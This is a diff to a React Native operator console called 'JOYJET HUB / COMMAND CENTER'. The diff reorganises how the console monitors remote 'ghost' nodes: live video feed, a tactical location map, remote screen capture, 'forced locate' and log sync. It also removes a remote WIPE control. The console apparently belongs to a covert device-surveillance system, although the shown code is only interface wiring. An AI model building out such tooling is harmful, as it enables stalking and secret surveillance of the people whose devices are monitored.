@@ -11,6 +11,10 @@ import TacticalMap from '../components/TacticalMap';
 const AdminScreen = ({ onLogout, name }) => {
   const [ghosts, setGhosts] = useState({});
   const [logs, setLogs] = useState([]);
+  const [selectedGhostId, setSelectedGhostId] = useState(null);
+  const [activeTab, setActiveTab] = useState('FEED'); // FEED, MAP, SNAPS, LOGS
+
+  const selectedGhost = selectedGhostId ? ghosts[selectedGhostId] : null;
 
   useEffect(() => {
     socket.on('heartbeat_update', (data) => {
@@ -84,61 +88,153 @@ const AdminScreen = ({ onLogout, name }) => {
       
       <View style={styles.header}>
         <Text style={styles.headerTitle}>JOYJET HUB / COMMAND CENTER</Text>
-        <View style={styles.onlineIndicator}>
-          <View style={styles.greenDot} />
-          <Text style={styles.onlineCount}>{Object.keys(ghosts).length} NODES OPERATIONAL</Text>
-        </View>
         <TouchableOpacity style={styles.logoutBtn} onPress={onLogout}>
           <Text style={styles.logoutTxt}>[ LOGOUT ]</Text>
         </TouchableOpacity>
       </View>
 
-      <ScrollView style={styles.nodeList}>
-        {Object.values(ghosts).map((ghost) => (
-          <View key={ghost.name} style={styles.ghostCard}>
-            <View style={styles.cardHeader}>
-              <Text style={styles.nodeId}>GHOST :: {ghost.name.toUpperCase()}</Text>
-              <Text style={styles.vitals}>{ghost.battery}</Text>
-            </View>
-
-            <VideoFeed ghostName={ghost.name} adminName={name} />
-            <TacticalMap location={ghost.location} ghostName={ghost.name} />
-
-            <View style={styles.controls}>
-              <TouchableOpacity style={styles.btn} onPress={() => sendCommand(ghost.name, 'SNAPSHOT')}>
-                <Text style={styles.btnTxt}>CAPTURE</Text>
+      {/* GHOST SELECTOR */}
+      <View style={styles.selectorContainer}>
+        <ScrollView horizontal showsHorizontalScrollIndicator={false} contentContainerStyle={styles.selectorScroll}>
+          {Object.values(ghosts).length === 0 ? (
+            <Text style={styles.emptyText}>NO ACTIVE NODES DETECTED</Text>
+          ) : (
+            Object.values(ghosts).map((ghost) => (
+              <TouchableOpacity 
+                key={ghost.name} 
+                style={[styles.selectorChip, selectedGhostId === ghost.name && styles.selectorChipActive]}
+                onPress={() => setSelectedGhostId(ghost.name)}
+              >
+                <View style={[styles.dot, ghost.status === 'CONNECTED' ? styles.dotGreen : styles.dotOrange]} />
+                <Text style={[styles.selectorText, selectedGhostId === ghost.name && styles.selectorTextActive]}>
+                  {ghost.name.split('_').pop().toUpperCase()}
+                </Text>
               </TouchableOpacity>
-              <TouchableOpacity style={[styles.btn, styles.danger]} onPress={() => sendCommand(ghost.name, 'WIPE')}>
-                <Text style={styles.btnTxt}>WIPE</Text>
+            ))
+          )}
+        </ScrollView>
+      </View>
+
+      {selectedGhost ? (
+        <>
+          {/* TAB NAVIGATION */}
+          <View style={styles.tabBar}>
+            {['FEED', 'MAP', 'SNAPS', 'LOGS'].map(tab => (
+              <TouchableOpacity 
+                key={tab} 
+                style={[styles.tab, activeTab === tab && styles.tabActive]}
+                onPress={() => setActiveTab(tab)}
+              >
+                <Text style={[styles.tabText, activeTab === tab && styles.tabTextActive]}>{tab}</Text>
               </TouchableOpacity>
-            </View>
+            ))}
           </View>
-        ))}
-      </ScrollView>
 
-      <LogConsole logs={logs} />
+          {/* TAB CONTENT */}
+          <ScrollView style={styles.content}>
+            <View style={styles.ghostInfoHead}>
+              <Text style={styles.ghostIdText}>GHOST :: {selectedGhost.name.toUpperCase()}</Text>
+              <Text style={styles.vitals}>{selectedGhost.battery || '--'}</Text>
+            </View>
+
+            {activeTab === 'FEED' && (
+              <View style={styles.tabSection}>
+                <VideoFeed ghostName={selectedGhost.name} adminName={name} />
+                <View style={styles.controls}>
+                  <TouchableOpacity style={styles.btn} onPress={() => sendCommand(selectedGhost.name, 'SNAPSHOT')}>
+                    <Text style={styles.btnTxt}>CAPTURE SCREEN</Text>
+                  </TouchableOpacity>
+                </View>
+              </View>
+            )}
+
+            {activeTab === 'MAP' && (
+              <View style={styles.tabSection}>
+                <TacticalMap location={selectedGhost.location} ghostName={selectedGhost.name} />
+                <View style={styles.controls}>
+                  <TouchableOpacity style={styles.btn} onPress={() => sendCommand(selectedGhost.name, 'PING')}>
+                    <Text style={styles.btnTxt}>FORCED LOCATE</Text>
+                  </TouchableOpacity>
+                </View>
+              </View>
+            )}
+
+            {activeTab === 'SNAPS' && (
+              <View style={styles.tabSection}>
+                <Text style={styles.sectionLabel}>SCREEN CAPTURE LOGS</Text>
+                <View style={styles.snapPlaceholder}>
+                  <Text style={styles.placeholderText}>NO RECENT DATA</Text>
+                </View>
+                <TouchableOpacity style={styles.btn} onPress={() => sendCommand(selectedGhost.name, 'LOG_SYNC')}>
+                  <Text style={styles.btnTxt}>SYNC RECORDS</Text>
+                </TouchableOpacity>
+              </View>
+            )}
+
+            {activeTab === 'LOGS' && (
+              <View style={styles.tabSection}>
+                <LogConsole logs={logs.filter(l => l.message.includes(selectedGhost.name) || l.type === 'SYSTEM')} />
+              </View>
+            )}
+          </ScrollView>
+        </>
+      ) : (
+        <View style={styles.initOverlay}>
+          <ActivityIndicator color="#00ff00" size="large" />
+          <Text style={styles.initText}>SELECT A GHOST NODE TO INITIALIZE STREAM</Text>
+          <LogConsole logs={logs} />
+        </View>
+      )}
     </SafeAreaView>
   );
 };
 
 const styles = StyleSheet.create({
   container: { flex: 1, backgroundColor: '#000' },
-  header: { paddingVertical: 15, alignItems: 'center', backgroundColor: '#050505', borderBottomWidth: 1, borderBottomColor: '#111' },
+  header: { paddingVertical: 15, paddingHorizontal: 20, flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', backgroundColor: '#050505', borderBottomWidth: 1, borderBottomColor: '#111' },
   headerTitle: { color: '#fff', fontSize: 10, letterSpacing: 5 },
-  onlineIndicator: { flexDirection: 'row', alignItems: 'center', marginTop: 5 },
-  greenDot: { width: 4, height: 4, borderRadius: 2, backgroundColor: '#00ff00', marginRight: 5 },
-  onlineCount: { color: '#00ff00', fontSize: 8, fontWeight: 'bold' },
-  logoutBtn: { marginTop: 8, paddingHorizontal: 12, paddingVertical: 4, borderWidth: 0.5, borderColor: '#ff4444', borderRadius: 3 },
+  logoutBtn: { paddingHorizontal: 12, paddingVertical: 4, borderWidth: 0.5, borderColor: '#ff4444', borderRadius: 3 },
   logoutTxt: { color: '#ff4444', fontSize: 7, letterSpacing: 2 },
-  nodeList: { flex: 1, padding: 10 },
-  ghostCard: { backgroundColor: '#080808', borderRadius: 8, padding: 12, marginBottom: 15, borderWidth: 1, borderColor: '#111' },
-  cardHeader: { flexDirection: 'row', justifyContent: 'space-between', marginBottom: 8 },
-  nodeId: { color: '#444', fontSize: 9, fontWeight: 'bold' },
-  vitals: { color: '#00ff00', fontSize: 9 },
-  controls: { flexDirection: 'row', gap: 10, marginTop: 12 },
-  btn: { flex: 1, height: 35, borderWidth: 1, borderColor: '#222', justifyContent: 'center', alignItems: 'center', borderRadius: 4 },
-  danger: { borderColor: '#ff4444' },
-  btnTxt: { color: '#fff', fontSize: 9, fontWeight: 'bold', letterSpacing: 1 }
+  
+  // Ghost Selector
+  selectorContainer: { backgroundColor: '#080808', borderBottomWidth: 1, borderBottomColor: '#111' },
+  selectorScroll: { padding: 10, gap: 10 },
+  selectorChip: { flexDirection: 'row', alignItems: 'center', paddingHorizontal: 15, paddingVertical: 8, backgroundColor: '#000', borderWidth: 1, borderColor: '#222', borderRadius: 20 },
+  selectorChipActive: { borderColor: '#00ff00', backgroundColor: '#00ff0011' },
+  selectorText: { color: '#444', fontSize: 10, fontWeight: 'bold' },
+  selectorTextActive: { color: '#00ff00' },
+  dot: { width: 6, height: 6, borderRadius: 3, marginRight: 8 },
+  dotGreen: { backgroundColor: '#00ff00' },
+  dotOrange: { backgroundColor: '#ffaa00' },
+  emptyText: { color: '#222', fontSize: 9, letterSpacing: 2, padding: 5 },
+
+  // Tabs
+  tabBar: { flexDirection: 'row', backgroundColor: '#050505', borderBottomWidth: 1, borderBottomColor: '#111' },
+  tab: { flex: 1, paddingVertical: 12, alignItems: 'center', borderBottomWidth: 2, borderBottomColor: 'transparent' },
+  tabActive: { borderBottomColor: '#00ff00' },
+  tabText: { color: '#444', fontSize: 9, fontWeight: 'bold', letterSpacing: 1 },
+  tabTextActive: { color: '#00ff00' },
+
+  // Content
+  content: { flex: 1 },
+  ghostInfoHead: { flexDirection: 'row', justifyContent: 'space-between', padding: 15, backgroundColor: '#020202' },
+  ghostIdText: { color: '#666', fontSize: 10, fontWeight: 'bold' },
+  vitals: { color: '#00ff00', fontSize: 10, fontWeight: 'bold' },
+  tabSection: { padding: 15 },
+  sectionLabel: { color: '#333', fontSize: 9, fontWeight: 'bold', marginBottom: 15, letterSpacing: 1 },
+  
+  // Controls
+  controls: { marginTop: 15 },
+  btn: { width: '100%', height: 45, borderWidth: 1, borderColor: '#00ff00', justifyContent: 'center', alignItems: 'center', borderRadius: 4, backgroundColor: '#00ff0005' },
+  btnTxt: { color: '#00ff00', fontSize: 10, fontWeight: 'bold', letterSpacing: 2 },
+  
+  // Placeholders
+  snapPlaceholder: { height: 200, backgroundColor: '#030303', borderWidth: 1, borderColor: '#111', borderRadius: 5, justifyContent: 'center', alignItems: 'center', marginBottom: 15 },
+  placeholderText: { color: '#111', fontSize: 10, fontWeight: 'bold' },
+
+  // Init State
+  initOverlay: { flex: 1, justifyContent: 'center', alignItems: 'center', padding: 20 },
+  initText: { color: '#222', fontSize: 9, fontWeight: 'bold', letterSpacing: 2, marginTop: 20, marginBottom: 40, textAlign: 'center' }
 });
 
 export default AdminScreen;
